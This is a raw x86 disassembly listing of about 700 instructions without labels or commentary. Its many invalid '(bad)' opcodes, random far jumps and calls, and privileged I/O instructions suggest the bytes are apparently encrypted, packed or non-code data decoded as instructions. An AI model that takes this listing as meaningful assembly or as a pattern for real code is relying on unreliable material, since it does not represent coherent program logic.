  409cdf:	xchg   BYTE PTR [edi],bl
  409ce1:	rol    dh,0x48
  409ce4:	jns    0x409d08
  409ce6:	pop    esi
  409ce7:	dec    esi
  409ce8:	mov    ds:0xfe648be3,eax
  409ced:	and    eax,0x20cc52e
  409cf2:	sahf   
  409cf3:	fld    TBYTE PTR [ecx-0x36f10e8a]
  409cf9:	jbe    0x409cd9
  409cfb:	mov    bh,0xe4
  409cfd:	add    DWORD PTR [edi],ecx
  409cff:	pop    ebp
  409d00:	sahf   
  409d01:	push   ebp
  409d02:	fadd   st,st(3)
  409d04:	ins    DWORD PTR es:[edi],dx
  409d05:	jns    0x409ccc
  409d07:	jmp    0x1c8c70f0
  409d0c:	adc    BYTE PTR [edi+0x4],0x99
  409d10:	cmp    al,0x76
  409d12:	jae    0x409ca2
  409d14:	enter  0x66df,0xe2
  409d18:	sahf   
  409d19:	arpl   bx,dx
  409d1b:	sbb    eax,0xe829f43c
  409d20:	xor    ecx,DWORD PTR [ecx-0xc2241fc]
  409d26:	xchg   ebx,eax
  409d27:	xchg   DWORD PTR [ebx+0x169ed613],edx
  409d2d:	sub    dh,BYTE PTR [esi+0x46]
  409d30:	jmp    0x409d50
  409d32:	xor    ecx,DWORD PTR [ebx]
  409d34:	push   ss
  409d35:	sbb    edi,DWORD PTR [ecx+0x1df74947]
  409d3b:	cmp    BYTE PTR [edi-0x7a],0xa0
  409d3f:	in     eax,dx
  409d40:	rcl    ebx,1
  409d42:	adc    BYTE PTR [eax-0xb],dl
  409d45:	leave  
  409d46:	shr    DWORD PTR [edx],1
  409d48:	je     0x409d84
  409d4a:	inc    eax
  409d4b:	push   0xfffffffa
  409d4d:	(bad)  
  409d4e:	(bad)  
  409d4f:	test   eax,0x16e06bf0
  409d54:	jo     0x409d5f
  409d56:	dec    ebp
  409d57:	sub    edi,DWORD PTR [edi-0x5ec89b63]
  409d5d:	test   al,0xd1
  409d5f:	in     eax,0xb0
  409d61:	jge    0x409d0a
  409d63:	and    esp,esp
  409d65:	or     eax,0x4508f7f8
  409d6a:	push   edi
  409d6b:	add    eax,0x3058ce7d
  409d70:	sub    BYTE PTR [eax+0x78],cl
  409d73:	retf   0xaed5
  409d76:	mov    ah,0xe
  409d78:	and    ebx,DWORD PTR [esi]
  409d7a:	mov    cl,BYTE PTR [ebx+0x7c]
  409d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7e:	sbb    ecx,DWORD PTR [edx-0x46]
  409d81:	popf   
  409d82:	push   ebp
  409d83:	ror    BYTE PTR [ecx-0x17e27791],1
  409d89:	inc    edi
  409d8a:	(bad)  
  409d8c:	lahf   
  409d8d:	repnz repz xor edi,DWORD PTR [ebx-0x12]
  409d92:	xchg   edx,eax
  409d93:	(bad)
  409d96:	ss cmp edx,esp
  409d99:	ret    
  409d9a:	xchg   DWORD PTR [edi+0x62c146fd],eax
  409da0:	add    eax,0x926b8fbb
  409da5:	mov    ecx,0x6a151715
  409daa:	mov    ds:0xd00086c1,eax
  409daf:	mov    ds:0xb9152ac4,al
  409db4:	out    0xb,eax
  409db6:	dec    ebp
  409db7:	ja     0x409de4
  409db9:	push   cs
  409dba:	pop    esp
  409dbb:	mov    cl,0x2b
  409dbd:	mov    cl,0xa
  409dbf:	data16 lods al,BYTE PTR ds:[si]
  409dc2:	mov    esp,0x51104d7a
  409dc7:	push   edi
  409dc8:	sbb    bh,BYTE PTR [esp+eiz*4]
  409dcb:	enter  0x5221,0xbf
  409dcf:	jecxz  0x409e0e
  409dd1:	clc    
  409dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd3:	es jae 0x409e09
  409dd6:	sbb    DWORD PTR [eax],ebp
  409dd8:	cwde   
  409dd9:	outs   dx,BYTE PTR ds:[esi]
  409dda:	jmp    0x4f0beda7
  409ddf:	shr    BYTE PTR [ebx+0x25],0x11
  409de3:	rol    BYTE PTR [edx+0x78e5c29c],cl
  409de9:	test   eax,0xa324b5eb
  409dee:	fsubp  st(6),st
  409df0:	sub    bh,BYTE PTR [edi]
  409df2:	push   ss
  409df3:	iret   
  409df4:	and    BYTE PTR [esi-0x2d685ba],dl
  409dfa:	push   cs
  409dfb:	xor    ebx,ecx
  409dfd:	xchg   ecx,eax
  409dfe:	hlt    
  409dff:	(bad)  
  409e00:	sub    eax,0x3f52c939
  409e05:	aad    0x56
  409e07:	dec    ebx
  409e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e09:	fnsave [ebx+0x5ca63d9b]
  409e0f:	dec    ecx
  409e10:	xor    dl,dh
  409e12:	nop    DWORD PTR [edx]
  409e15:	call   0x1dd9:0x59a929d4
  409e1c:	or     eax,0x33ca88ae
  409e21:	call   FWORD PTR [ebx-0x5b89e21d]
  409e27:	outs   dx,DWORD PTR ds:[esi]
  409e28:	push   0x991279e8
  409e2d:	xor    eax,DWORD PTR [esi*8-0x38c7c77f]
  409e34:	adc    BYTE PTR [ecx+0x42],cl
  409e37:	psubq  mm3,mm7
  409e3a:	mov    bh,0xd8
  409e3c:	or     DWORD PTR ds:0xe0945a83,0xe
  409e43:	jp     0x409e9b
  409e45:	jl     0x409e01
  409e47:	pop    ds
  409e48:	sti    
  409e49:	lock inc ecx
  409e4b:	jmp    0x19c833bc
  409e50:	push   ebx
  409e51:	sub    al,0x56
  409e53:	leave  
  409e54:	add    BYTE PTR [ecx-0x40ab6da9],bh
  409e5a:	inc    ebx
  409e5b:	fidiv  DWORD PTR [edi-0x68327cff]
  409e61:	dec    ecx
  409e62:	jle    0x409e3f
  409e64:	cmp    BYTE PTR [eax],cl
  409e66:	add    esi,DWORD PTR [ebx]
  409e68:	push   0x34
  409e6a:	push   ebx
  409e6b:	mov    bh,0xfd
  409e6d:	adc    ch,BYTE PTR [ecx-0xd]
  409e70:	pop    ecx
  409e71:	imul   esp,DWORD PTR [ebp+0x3c],0xdc362f16
  409e78:	adc    DWORD PTR [edx-0x53c576cf],ebx
  409e7e:	inc    eax
  409e7f:	xchg   edx,eax
  409e80:	sub    eax,0x556c358e
  409e85:	sbb    BYTE PTR fs:[edx+edi*4],dl
  409e89:	pop    esi
  409e8a:	fucomip st,st(3)
  409e8c:	adc    DWORD PTR [ebx+0x2e],ecx
  409e8f:	mov    dl,0x40
  409e91:	daa    
  409e92:	xor    al,0x3e
  409e94:	enter  0x5cb1,0xf0
  409e98:	cmp    eax,0xe65005fa
  409e9d:	jmp    0x6aac67ef
  409ea2:	loopne 0x409eae
  409ea4:	cmp    DWORD PTR [ecx-0x3e],0xffffffaf
  409ea8:	sbb    eax,0x4b8f00af
  409ead:	and    ebx,DWORD PTR [esi+0x682ccdc2]
  409eb3:	stos   BYTE PTR es:[edi],al
  409eb4:	mov    ecx,DWORD PTR [edi-0x4c]
  409eb7:	lock aad 0x67
  409eba:	jmp    0x409f34
  409ebc:	stc    
  409ebd:	mov    eax,ds:0xf8d3dc1c
  409ec2:	pop    es
  409ec3:	pand   mm4,QWORD PTR ds:0x7b05502f
  409eca:	dec    eax
  409ecb:	mov    dh,0xfe
  409ecd:	inc    edx
  409ece:	lods   eax,DWORD PTR ds:[esi]
  409ecf:	pusha  
  409ed0:	mov    al,ds:0x37d51028
  409ed5:	mov    bl,0x0
  409ed7:	xchg   edi,eax
  409ed8:	mov    bl,0x84
  409eda:	push   edi
  409edb:	addr16 xchg esi,eax
  409edd:	sub    al,0x6e
  409edf:	mov    al,ds:0xba6d4e5b
  409ee4:	inc    ebp
  409ee5:	cmp    al,0xe7
  409ee7:	and    al,BYTE PTR [edx+0x37]
  409eea:	stos   BYTE PTR es:[edi],al
  409eeb:	and    ch,dh
  409eed:	bound  edi,QWORD PTR [ecx]
  409eef:	repz out 0x22,al
  409ef2:	dec    esp
  409ef3:	loop   0x409ebc
  409ef5:	jp     0x409f65
  409ef7:	xor    edi,DWORD PTR [esi]
  409ef9:	cmp    BYTE PTR [esi+0x72d3d81c],bl
  409eff:	adc    eax,0xbbb793a
  409f04:	ss mov dh,0x22
  409f07:	cs aam 0x4c
  409f0a:	cs mov esi,0x5bdbe901
  409f10:	xchg   ecx,eax
  409f11:	pop    ebx
  409f12:	in     eax,0x84
  409f14:	unpckhps xmm7,xmm4
  409f17:	hlt    
  409f18:	es sub al,0x7e
  409f1b:	std    
  409f1c:	xor    BYTE PTR [eax],dl
  409f1e:	sar    BYTE PTR [eax],cl
  409f20:	ret    0xf2b9
  409f23:	fwait
  409f24:	jmp    0x485719c2
  409f29:	les    esp,FWORD PTR [ecx]
  409f2b:	arpl   bp,bp
  409f2d:	ret    
  409f2e:	and    al,0x10
  409f30:	inc    edx
  409f31:	push   esi
  409f32:	adc    BYTE PTR [eax-0x46217a45],dl
  409f38:	popa   
  409f39:	imul   esp,DWORD PTR [esi],0x5ea6cbcb
  409f3f:	ja     0x409f03
  409f41:	mov    ebp,0x8fcfbdc0
  409f46:	fs xchg edi,eax
  409f48:	std    
  409f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f4a:	add    bl,BYTE PTR [esp+edi*2+0x4b830233]
  409f51:	ja     0x409f1a
  409f53:	in     al,dx
  409f54:	cmp    cl,al
  409f56:	out    dx,eax
  409f57:	sub    BYTE PTR [edx],cl
  409f59:	xor    esp,DWORD PTR [edx+0x68fd7d9a]
  409f5f:	push   esp
  409f60:	cld    
  409f61:	in     al,0x3e
  409f63:	js     0x409fc1
  409f65:	ds call 0x8c6f:0xff3a8515
  409f6d:	repnz lock fsubr QWORD PTR [ebx]
  409f71:	retf   
  409f72:	inc    edx
  409f73:	and    BYTE PTR [esi-0x6a],bl
  409f76:	clc    
  409f77:	scas   eax,DWORD PTR es:[edi]
  409f78:	test   BYTE PTR [eax-0x54f33271],0xb5
  409f7f:	stc    
  409f80:	ins    DWORD PTR es:[edi],dx
  409f81:	cmc    
  409f82:	lahf   
  409f83:	je     0x409fd7
  409f85:	shl    BYTE PTR [edi+0x1b],0x9c
  409f89:	mov    ds:0x6fe2e079,eax
  409f8e:	inc    esp
  409f8f:	stos   BYTE PTR es:[edi],al
  409f90:	scas   al,BYTE PTR es:[edi]
  409f91:	shl    BYTE PTR [ebp+0x67],1
  409f94:	xchg   al,bl
  409f96:	js     0x409fe7
  409f98:	inc    ebp
  409f99:	mov    edi,0xa501a053
  409f9e:	(bad)  [ecx+ebp*4-0x7a]
  409fa2:	int3   
  409fa3:	adc    BYTE PTR [ebp+0x562b73d1],bl
  409fa9:	sub    DWORD PTR [esi-0x2b15bce3],eax
  409faf:	or     al,0x50
  409fb1:	sub    BYTE PTR [edi],0x78
  409fb4:	mov    cl,0x4a
  409fb6:	mov    esi,0xb0873802
  409fbb:	mov    edi,0x66f1bae3
  409fc0:	dec    eax
  409fc1:	adc    esp,esi
  409fc3:	aas    
  409fc4:	and    al,BYTE PTR [esi]
  409fc6:	stos   DWORD PTR es:[edi],eax
  409fc7:	ins    DWORD PTR es:[edi],dx
  409fc8:	pop    esi
  409fc9:	jns    0x409f88
  409fcb:	ja     0x409f7c
  409fcd:	icebp  
  409fce:	mov    ah,0xad
  409fd0:	xchg   BYTE PTR [esi+0x15],bh
  409fd3:	cmp    bh,BYTE PTR [esi+0x6d256d58]
  409fd9:	stc    
  409fda:	stos   BYTE PTR es:[edi],al
  409fdb:	outs   dx,BYTE PTR ds:[esi]
  409fdc:	dec    edx
  409fdd:	and    BYTE PTR ds:0xabe75d97,bh
  409fe3:	xor    edx,DWORD PTR [eax+0x5c]
  409fe6:	inc    ebx
  409fe7:	xchg   ecx,eax
  409fe8:	adc    dl,BYTE PTR [edi+0x7a2ac8bd]
  409fee:	sub    dl,BYTE PTR [esi]
  409ff0:	add    eax,0xf4caeb74
  409ff5:	cmp    eax,0xe81b97fe
  409ffa:	push   ecx
  409ffb:	mov    esi,0x25ff64f7
  40a000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a001:	call   0x77513eed
  40a006:	mov    WORD PTR [eax+0x24],cs
  40a009:	jmp    0xbdf2:0xb76d
  40a00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a010:	jnp    0x40a02e
  40a012:	inc    eax
  40a013:	sti    
  40a014:	cmp    ebp,edx
  40a016:	sub    esp,DWORD PTR [ebp-0x61]
  40a019:	cld    
  40a01a:	iret   
  40a01b:	test   eax,esp
  40a01d:	xchg   esi,eax
  40a01e:	dec    esi
  40a01f:	test   eax,0x78103216
  40a024:	sbb    esp,esi
  40a026:	and    bh,BYTE PTR [esi-0xb]
  40a029:	js     0x40a09a
  40a02b:	call   0xab0:0xbb3f4d67
  40a032:	jae    0x40a04c
  40a034:	dec    ebx
  40a035:	out    dx,eax
  40a036:	push   edi
  40a037:	and    ch,BYTE PTR [edx]
  40a039:	mov    al,ds:0x2e1cf9a9
  40a03e:	pop    edi
  40a03f:	nop
  40a040:	mov    eax,0x968cce5e
  40a045:	pop    es
  40a046:	pop    ds
  40a047:	data16 jge 0x40a01c
  40a04a:	rol    esi,1
  40a04c:	jae    0x409fd0
  40a04e:	imul   esp,DWORD PTR [esi-0x3759f05b],0xdac89bde
  40a058:	jecxz  0x40a09d
  40a05a:	lock gs sbb eax,0x8f544e16
  40a061:	sub    eax,0x3755a805
  40a066:	scas   al,BYTE PTR es:[edi]
  40a067:	inc    edi
  40a068:	fwait
  40a069:	nop
  40a06a:	cli    
  40a06b:	adc    BYTE PTR [ecx],bl
  40a06d:	adc    al,0xa3
  40a06f:	cld    
  40a070:	sub    cl,BYTE PTR [ebp-0x657972d3]
  40a076:	mov    WORD PTR [ebx-0x2e387978],ds
  40a07c:	inc    ebx
  40a07d:	repz ficomp DWORD PTR [ecx+0x1]
  40a081:	or     DWORD PTR [ecx],eax
  40a083:	call   0xda7d:0x9dbcd2c7
  40a08a:	jl     0x40a0bc
  40a08c:	mov    esi,0xeed8bef0
  40a091:	push   ds
  40a092:	dec    esi
  40a093:	rcr    DWORD PTR [edx-0x1a],0x1e
  40a097:	and    ecx,edx
  40a099:	jb     0x40a020
  40a09b:	ss sahf 
  40a09d:	dec    edx
  40a09e:	xchg   ecx,eax
  40a09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a0:	inc    edx
  40a0a1:	test   BYTE PTR [esi-0x6b4835f],0x2a
  40a0a8:	jno    0x40a0b6
  40a0aa:	jge    0x40a099
  40a0ac:	mov    ebx,0xfe6e1d8f
  40a0b1:	mov    al,ds:0x89adaf54
  40a0b6:	test   eax,0xed65b6c8
  40a0bb:	mov    eax,0xb2c9ef9e
  40a0c0:	cmp    ecx,DWORD PTR [ecx+eax*1-0x2c4cca32]
  40a0c7:	and    BYTE PTR ds:0xf9320032,dl
  40a0cd:	cld    
  40a0ce:	stos   DWORD PTR es:[edi],eax
  40a0cf:	aaa    
  40a0d0:	add    al,0x5a
  40a0d2:	shr    dh,0x2f
  40a0d5:	and    eax,0x14063f5b
  40a0da:	mov    esp,DWORD PTR [esi+0x6d27425b]
  40a0e0:	pop    edx
  40a0e1:	iret   
  40a0e2:	mov    cl,0x7e
  40a0e4:	dec    esi
  40a0e5:	cld    
  40a0e6:	dec    edx
  40a0e7:	enter  0x4ffe,0xb5
  40a0eb:	or     DWORD PTR [ebx-0x58d3fd68],edi
  40a0f1:	std    
  40a0f2:	xchg   ebp,eax
  40a0f3:	inc    edi
  40a0f4:	xchg   ecx,ecx
  40a0f6:	popf   
  40a0f7:	(bad)  
  40a0f8:	mov    al,ds:0x7e764004
  40a0fd:	sar    cl,cl
  40a0ff:	mov    ebp,0xa794d751
  40a104:	jecxz  0x40a090
  40a106:	lds    ebx,FWORD PTR [ebp+esi*1+0xc]
  40a10a:	stos   BYTE PTR es:[edi],al
  40a10b:	test   al,0xe2
  40a10d:	jbe    0x40a10f
  40a10f:	add    DWORD PTR [edi+0x13],edi
  40a112:	into   
  40a113:	stos   DWORD PTR es:[edi],eax
  40a114:	cs xor al,0x75
  40a117:	jp     0x40a0e3
  40a119:	mov    dh,0x34
  40a11b:	cmp    DWORD PTR [edx-0x30],esi
  40a11e:	add    al,0xdf
  40a120:	je     0x40a0e0
  40a122:	fcmovbe st,st(7)
  40a124:	inc    edi
  40a125:	xlat   BYTE PTR ds:[ebx]
  40a126:	xor    al,0xa2
  40a128:	lahf   
  40a129:	pop    ebx
  40a12a:	test   DWORD PTR [edx+esi*1+0x6d],ebp
  40a12e:	sbb    eax,0xff988af
  40a133:	popf   
  40a134:	jnp    0x40a119
  40a136:	pop    esp
  40a137:	imul   edi,DWORD PTR [ebx],0xffffffca
  40a13a:	aad    0xe
  40a13c:	mov    esp,0xfefdf52c
  40a141:	push   ecx
  40a142:	dec    eax
  40a143:	mov    eax,ds:0x84b621a6
  40a148:	clc    
  40a149:	jmp    0x10cc:0xad39fad0
  40a150:	and    eax,esp
  40a152:	xchg   edx,eax
  40a153:	pop    edi
  40a154:	push   ss
  40a155:	adc    BYTE PTR [edi+0x48094eae],0xff
  40a15c:	sbb    BYTE PTR [edx-0x3d6691f5],bl
  40a162:	iret   
  40a163:	ret    
  40a164:	sbb    bh,BYTE PTR [ebx+0x2b]
  40a167:	adc    DWORD PTR [ebx],0x7eaeeb64
  40a16d:	xor    ebp,0xc58f0091
  40a173:	(bad)  
  40a174:	mov    eax,0x62aa7b0f
  40a179:	clc    
  40a17a:	or     eax,0x7e11ddf2
  40a17f:	jb     0x40a1cd
  40a181:	out    dx,eax
  40a182:	push   ecx
  40a183:	adc    eax,edi
  40a185:	sbb    eax,0x6783f955
  40a18a:	test   eax,0x8f629689
  40a18f:	fisttp DWORD PTR [esp+esi*4]
  40a192:	pop    esp
  40a193:	mov    BYTE PTR [eax-0x78],cl
  40a196:	ror    BYTE PTR [ebx],cl
  40a198:	daa    
  40a199:	adc    BYTE PTR [esi+0x23],bl
  40a19c:	xlat   BYTE PTR ds:[ebx]
  40a19d:	inc    eax
  40a19e:	jge    0x40a13e
  40a1a0:	fstp   DWORD PTR [ebx-0x22]
  40a1a3:	pop    ds
  40a1a4:	mov    ebp,DWORD PTR [edi-0x1670b486]
  40a1aa:	dec    ebx
  40a1ab:	je     0x40a1e8
  40a1ad:	jae    0x40a17a
  40a1af:	shr    DWORD PTR [edx-0x7d],cl
  40a1b2:	and    esp,edi
  40a1b4:	or     ch,BYTE PTR [edi]
  40a1b6:	pop    edx
  40a1b7:	jg     0x40a212
  40a1b9:	pop    edi
  40a1ba:	aad    0xbe
  40a1bc:	push   cs
  40a1bd:	fsub   st(7),st
  40a1bf:	fdivp  st(3),st
  40a1c1:	scas   al,BYTE PTR es:[edi]
  40a1c2:	lds    edi,FWORD PTR [esi+0x22]
  40a1c5:	into   
  40a1c6:	scas   eax,DWORD PTR es:[edi]
  40a1c7:	sbb    esi,DWORD PTR es:[ecx+ebx*1+0x55]
  40a1cc:	dec    ecx
  40a1cd:	ficomp DWORD PTR [esi+0x31]
  40a1d0:	push   esi
  40a1d1:	mov    edx,0x3f511e3
  40a1d6:	call   0xc307:0x82f5335c
  40a1dd:	cmp    cl,BYTE PTR [ebx-0x3d]
  40a1e0:	fmul   st,st(0)
  40a1e2:	iret   
  40a1e3:	into   
  40a1e4:	repz and esi,eax
  40a1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e8:	mov    WORD PTR [ebp+0x6a],gs
  40a1eb:	mov    ds,WORD PTR [ebx+0x7f]
  40a1ee:	jmp    0x99b6:0x86d25c30
  40a1f5:	daa    
  40a1f6:	int3   
  40a1f7:	cmp    DWORD PTR [eax],ebx
  40a1f9:	popa   
  40a1fa:	fidivr WORD PTR [ebx+0x28]
  40a1fd:	scas   eax,DWORD PTR es:[edi]
  40a1fe:	sub    BYTE PTR [edx],cl
  40a200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a201:	fdivr  QWORD PTR [eax-0x3139198c]
  40a207:	cs pop es
  40a209:	and    DWORD PTR [eax+0x4a],esi
  40a20c:	sub    ebp,esp
  40a20e:	jbe    0x40a1fb
  40a210:	adc    DWORD PTR [ebx+0x11a57b46],esi
  40a216:	adc    esi,DWORD PTR [esi]
  40a218:	js     0x40a297
  40a21a:	test   BYTE PTR [esi],cl
  40a21c:	mov    edx,0xbda71c5b
  40a221:	jae    0x40a1a6
  40a223:	inc    ecx
  40a224:	dec    esi
  40a225:	dec    esi
  40a226:	or     BYTE PTR [eax+eax*8],dh
  40a229:	(bad)  
  40a22a:	in     al,0xc
  40a22c:	scas   al,BYTE PTR es:[edi]
  40a22d:	dec    edi
  40a22e:	push   esp
  40a22f:	jge    0x40a2aa
  40a231:	or     BYTE PTR [ebx+0x7ff696b2],cl
  40a237:	(bad)  
  40a238:	stc    
  40a239:	jo     0x40a2a3
  40a23b:	mov    eax,0x7af6b409
  40a240:	dec    ebx
  40a241:	shr    BYTE PTR [ebp+0x213e9f9],0xb2
  40a248:	sti    
  40a249:	dec    esi
  40a24a:	adc    esi,DWORD PTR [ebp-0x22929651]
  40a250:	jmp    0xc85694d0
  40a255:	mov    cl,0xf1
  40a257:	js     0x40a25d
  40a259:	in     eax,0x9f
  40a25b:	call   DWORD PTR [ecx]
  40a25d:	mov    ?,WORD PTR [ebx-0x6]
  40a260:	xchg   ecx,eax
  40a261:	dec    ebp
  40a262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a263:	sbb    DWORD PTR [ebx+0x4],edx
  40a266:	retf   
  40a267:	cdq    
  40a268:	push   ebp
  40a269:	fwait
  40a26a:	imul   edx,DWORD PTR [ebp+0x7c],0xffffffd8
  40a26e:	out    dx,eax
  40a26f:	imul   ecx,esi,0xe8e0f02d
  40a275:	fcomp  DWORD PTR [ebp+0x15]
  40a278:	je     0x40a2f0
  40a27a:	(bad)  
  40a27b:	mov    ds:0x9b5226c3,eax
  40a280:	dec    esi
  40a281:	or     BYTE PTR [edi],ch
  40a283:	in     al,dx
  40a284:	sbb    esi,DWORD PTR [edi-0x1751f686]
  40a28a:	fist   DWORD PTR cs:[edx-0x52]
  40a28e:	add    BYTE PTR [edx],bl
  40a290:	and    ebx,ebp
  40a292:	int    0xb2
  40a294:	in     al,dx
  40a295:	jnp    0x40a273
  40a297:	cli    
  40a298:	mov    eax,ds:0xcf04d34
  40a29d:	jbe    0x40a2c0
  40a29f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a0:	(bad)  
  40a2a1:	sub    dh,BYTE PTR [eax]
  40a2a3:	mov    edx,0x9bdff9a3
  40a2a8:	push   cs
  40a2a9:	mov    ds:0x3b49ace8,eax
  40a2ae:	aad    0x63
  40a2b0:	sub    BYTE PTR [edx+0x14],0x98
  40a2b4:	inc    edi
  40a2b5:	lock mov BYTE PTR [ebp+eax*4-0x40],0x29
  40a2bb:	or     BYTE PTR [ecx+0x628a151a],ch
  40a2c1:	lods   eax,DWORD PTR ds:[esi]
  40a2c2:	add    BYTE PTR ds:[eax+esi*4-0x5dab1db8],ah
  40a2ca:	pop    ebp
  40a2cb:	pop    esi
  40a2cc:	mov    esi,0xf3986338
  40a2d1:	pop    ebp
  40a2d2:	cmp    edi,DWORD PTR [eax-0x1b]
  40a2d5:	setle  BYTE PTR [edi]
  40a2d8:	inc    DWORD PTR [edi-0x39]
  40a2db:	loop   0x40a28f
  40a2dd:	fld    TBYTE PTR [ebx]
  40a2df:	jb     0x40a322
  40a2e1:	xchg   ebp,eax
  40a2e2:	mov    esp,DWORD PTR [edi-0x74]
  40a2e5:	daa    
  40a2e6:	push   cs
  40a2e7:	dec    ecx
  40a2e8:	(bad)  [esi]
  40a2ea:	add    bh,BYTE PTR [ecx-0x4]
  40a2ed:	sti    
  40a2ee:	ret    
  40a2ef:	cmp    ah,bh
  40a2f1:	push   ds
  40a2f2:	gs fwait
  40a2f4:	inc    edi
  40a2f5:	mov    ds:0xa3cd2a7f,eax
  40a2fa:	xor    eax,0xc16cc289
  40a2ff:	mov    edi,0xa0743337
  40a304:	add    ecx,DWORD PTR [ecx+ecx*1+0x1b015995]
  40a30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a30c:	sbb    al,0xc9
  40a30e:	in     eax,0x19
  40a310:	mov    eax,0xda9af636
  40a315:	add    DWORD PTR ds:0xca6dbb8f,0x14cf831
  40a31f:	pop    DWORD PTR fs:[esp+esi*4-0x1cee24ce]
  40a327:	rcr    DWORD PTR ds:0xc0938646,1
  40a32d:	mov    esi,DWORD PTR [ecx+0x1a]
  40a330:	scas   eax,DWORD PTR es:[edi]
  40a331:	cmc    
  40a332:	xchg   BYTE PTR [esi+edi*2],bl
  40a335:	jl     0x40a2d8
  40a337:	pop    esp
  40a338:	sti    
  40a339:	sar    bh,0x7a
  40a33c:	jne    0x40a387
  40a33e:	fisttp WORD PTR [ebp+0x46]
  40a341:	sub    DWORD PTR [eax+0x49],esp
  40a344:	das    
  40a345:	pop    ebp
  40a346:	mov    ch,0x3e
  40a348:	imul   ebx,edx,0xfffffff2
  40a34b:	and    eax,0x3178f247
  40a350:	ja     0x40a2ef
  40a352:	repz test eax,0x17f711b9
  40a358:	shl    BYTE PTR [edx-0x10],1
  40a35b:	xchg   ebx,eax
  40a35c:	jle    0x40a365
  40a35e:	inc    edx
  40a35f:	loope  0x40a329
  40a361:	in     al,0x84
  40a363:	cmc    
  40a364:	xor    eax,0xd1a84066
  40a369:	jecxz  0x40a3bb
  40a36b:	(bad)  
  40a36c:	gs mov esp,?
  40a36f:	jnp    0x40a3d8
  40a371:	call   0x4864c3a8
  40a376:	jecxz  0x40a2fa
  40a378:	cmc    
  40a379:	dec    edx
  40a37a:	mov    ah,0xbd
  40a37c:	in     al,0xbc
  40a37e:	loope  0x40a353
  40a380:	aad    0x97
  40a382:	jp     0x40a3a6
  40a384:	mov    al,0x1a
  40a386:	mov    ebp,0xc7797a6e
  40a38b:	rcr    BYTE PTR [ebp+0x19],cl
  40a38e:	fs popf 
  40a390:	fisub  DWORD PTR [ebp-0xaa9689a]
  40a396:	sbb    DWORD PTR [ebx-0x31cbd0dc],0x78
  40a39d:	(bad)  
  40a39e:	mov    edi,0xca2447ff
  40a3a3:	aas    
  40a3a4:	and    DWORD PTR [ebx-0x75],eax
  40a3a7:	fdiv   st(4),st
  40a3a9:	sti    
  40a3aa:	or     BYTE PTR [eax+0x3a],dh
  40a3ad:	mov    esp,0xe0496057
  40a3b2:	stos   BYTE PTR es:[edi],al
  40a3b3:	fistp  DWORD PTR [eax]
  40a3b5:	sub    ebp,DWORD PTR [ecx]
  40a3b7:	popa   
  40a3b8:	(bad)  
  40a3b9:	inc    ecx
  40a3ba:	xor    al,dh
  40a3bc:	dec    esp
  40a3bd:	cmp    DWORD PTR [eax+0x67],edi
  40a3c0:	push   ecx
  40a3c1:	or     DWORD PTR [edi-0x2372334d],edi
  40a3c7:	loop   0x40a37c
  40a3c9:	push   esp
  40a3ca:	and    BYTE PTR [ebx],ah
  40a3cc:	pushf  
  40a3cd:	adc    bh,ch
  40a3cf:	data16 fdivr DWORD PTR [esi+edi*8-0x76]
  40a3d4:	mov    ds:0xef7c70f1,al
  40a3d9:	rcr    DWORD PTR [ecx],0x4d
  40a3dc:	inc    ebx
  40a3dd:	rol    DWORD PTR [ebx+0x4a8a6edd],1
  40a3e3:	cld    
  40a3e4:	sub    BYTE PTR [edi+0x1c],0x4d
  40a3e8:	adc    BYTE PTR [esi],cl
  40a3ea:	cld    
  40a3eb:	mov    eax,ds:0xfb0e35ee
  40a3f0:	push   edi
  40a3f1:	or     BYTE PTR ds:[edx],ch
  40a3f4:	aam    0x2
  40a3f6:	sbb    cl,ah
  40a3f8:	and    ebp,DWORD PTR ds:0x95a324e6
  40a3fe:	loope  0x40a3b6
  40a400:	test   ax,0xeb9c
  40a404:	pop    esp
  40a405:	or     ch,BYTE PTR [edi+ebp*2]
  40a408:	inc    edx
  40a409:	dec    esi
  40a40a:	test   eax,0x4feb4039
  40a40f:	mov    ebx,0xe58241b8
  40a414:	fld    QWORD PTR [edx]
  40a416:	sub    BYTE PTR [ecx+ebp*1-0xa074e3b],dl
  40a41d:	mov    DWORD PTR [edx],esp
  40a41f:	stos   DWORD PTR es:[edi],eax
  40a420:	pushf  
  40a421:	push   0x3805c25d
  40a426:	or     DWORD PTR [edi-0x78],ebx
  40a429:	push   esi
  40a42a:	hlt    
  40a42b:	push   esp
  40a42c:	cmp    BYTE PTR [esi+0x6e83aa45],al
  40a432:	aad    0xbd
  40a434:	cli    
  40a435:	enter  0x148c,0xa3
  40a439:	leave  
  40a43a:	fld    TBYTE PTR [eax+esi*4+0x69]
  40a43e:	rcr    BYTE PTR [edx+0x1b0dfd27],0x6b
  40a445:	out    0xdd,al
  40a447:	sbb    ch,BYTE PTR [edi-0x45]
  40a44a:	add    ebx,esi
  40a44c:	xor    al,0x23
  40a44e:	icebp  
  40a44f:	(bad)  
  40a450:	push   edi
  40a451:	imul   ebx,DWORD PTR [eax+0xa],0xfffffff3
  40a455:	jmp    0x2747:0x500086e
  40a45c:	sbb    DWORD PTR [ebp+0x78ff1ef2],edx
  40a462:	pop    edi
  40a463:	test   al,0x5f
  40a465:	sub    al,0xfb
  40a467:	xor    eax,eax
  40a469:	rcl    BYTE PTR [eax+0x7f],cl
  40a46c:	jg     0x40a43e
  40a46e:	leave  
  40a46f:	cwde   
  40a470:	out    dx,eax
  40a471:	inc    edx
  40a472:	cmp    al,ah
  40a474:	push   esp
  40a475:	fsubr  QWORD PTR [eax-0x4]
  40a478:	sub    ebx,DWORD PTR [esi]
  40a47a:	dec    ebx
  40a47b:	sti    
  40a47c:	dec    edi
  40a47d:	sbb    eax,0x2b7f9bb0
  40a482:	dec    ebx
  40a483:	adc    DWORD PTR [edi-0x69a3c397],ecx
